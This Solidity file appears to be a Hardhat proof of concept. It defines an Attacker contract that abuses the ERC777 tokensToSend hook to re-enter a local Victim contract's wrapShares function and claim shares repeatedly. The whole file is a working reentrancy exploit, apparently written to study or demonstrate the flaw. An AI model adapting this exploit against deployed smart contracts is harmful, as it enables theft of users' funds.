pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/token/ERC777/IERC777.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Sender.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import "./Victim.sol";
import "./ReEnter777.sol";
import "hardhat/console.sol";

contract Attacker is IERC777Sender {
    Victim private _victim;
    ReEnter777 private _token;

    // Counter to keep track of the number of reentrant calls
    uint256 private _called = 0;

    uint256 private _sharesToWithdrawal = 1;
    uint256 private _numberOfWithdrawals = 1;

    address payable private _attacker;

    IERC1820Registry private _erc1820 =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor(address victimAddress, address tokenAddress) {
        _victim = Victim(victimAddress);
        _token = ReEnter777(tokenAddress);
        _token.approve(victimAddress, 1_000_000_000);
        _attacker = payable(msg.sender);
        _erc1820.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensSender"),
            address(this)
        );
        _erc1820.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensRecipient"),
            address(this)
        );
    }

    // ERC777 hook
    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {
        console.log("=====BEGIN REENTER====");
        _victim.wrapShares(_sharesToWithdrawal);
        _called += 1;
        if (_called < _numberOfWithdrawals) {
            _callVictim(to);
        } else {
            console.log(
                "ENDING ATTACKER WRAPPED BALANCE",
                _victim.wrappedShares(address(this))
            );
        }
    }

    function callVictim(
        address ownerOfShares,
        uint256 sharesToWithdrawal,
        uint256 numberOfWithdrawals
    ) public {
        _sharesToWithdrawal = sharesToWithdrawal;
        _numberOfWithdrawals = numberOfWithdrawals;
        _callVictim(ownerOfShares);
    }

    function _callVictim(address ownerOfShares) private {
        _victim.buyShareFromUser(ownerOfShares, 1);
    }

    fallback() external payable {}

    receive() external payable {}
}
